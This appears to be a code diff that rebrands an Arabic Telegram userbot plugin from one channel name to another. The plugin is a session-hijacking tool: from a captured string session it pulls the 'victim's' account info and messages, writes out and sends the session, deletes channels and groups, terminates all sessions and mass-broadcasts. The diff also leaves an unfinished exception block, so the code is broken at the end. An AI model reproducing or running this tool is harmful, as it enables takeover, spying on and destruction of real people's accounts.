@@ -1,38 +1,6 @@
-# -*- coding: utf-8 -*-
-#By Source aljoker @FFAARRSS1
+from jepthon import bot, jepiq
+#By Source aljoker @jepthon
 from telethon import events, functions, types, Button
-import asyncio
-import io
-import re
-
-from telethon import Button, custom, events
-from telethon.tl.functions.users import GetFullUserRequest
-from JoKeRUB import bot
-from JoKeRUB.sql_helper.blacklist_assistant import (
-    add_nibba_in_db,
-    is_he_added,
-    removenibba,
-)
-from JoKeRUB.sql_helper.botusers_sql import add_me_in_db, his_userid
-from JoKeRUB.sql_helper.idadder_sql import (
-    add_usersid_in_db,
-    already_added,
-    get_all_users,
-)
-from l313l.razan.resources.assistant import *
-
-import asyncio
-import io
-import re
-import uuid
-import os
-from telethon import Button, custom, events
-from telethon.tl.functions.users import GetFullUserRequest
-from telethon.sync import TelegramClient
-from telethon.sessions import StringSession
-from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest
-from telethon import events
 from datetime import timedelta
 import asyncio
 from ..Config import Config
@@ -218,7 +186,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة فايبرو @FFAARRSS1
+قم بلأنضمام الى قناة الجوكر @Jepthon
 '''
 
 keyboard = [
@@ -243,13 +211,13 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس فايبرو 🤡", "https://t.me/FFAARRSS1")
+    Button.url("سورس الجوكر 🤡", "https://t.me/jepthon")
     ]
 ]
 
 
 
-@l313l.on(
+@jepiq.on(
     admin_cmd(
        pattern="هاك$"
     )
@@ -285,7 +253,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/FFAARRSS1")
+            Button.url("المطور", "https://t.me/jepthon")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -306,12 +274,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @FFAARRSS1")
+        file.write(i + "\n\nDetails BY @Jepthon")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس فايبرو ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️. \n/hack", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -324,7 +292,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس فايبرو ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -352,7 +320,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس فايبرو", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -398,7 +366,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك فايبرو.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الجوكر.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -427,7 +395,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك فايبرو.", buttons=keyboard)
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -517,7 +485,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/FFAARRSS1")
+        Button.url("القناة", "https://t.me/Jepthon")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
@@ -593,7 +561,4 @@ async def gcastb(strses, msg):
                         if chat != -1001606996743:
                             await X.send_message(chat, tol, file=file)
                             await asyncio.sleep(60)
-                    except Exception as e:
-                        print(e)
-        except Exception as e:
-            print(e)
+          
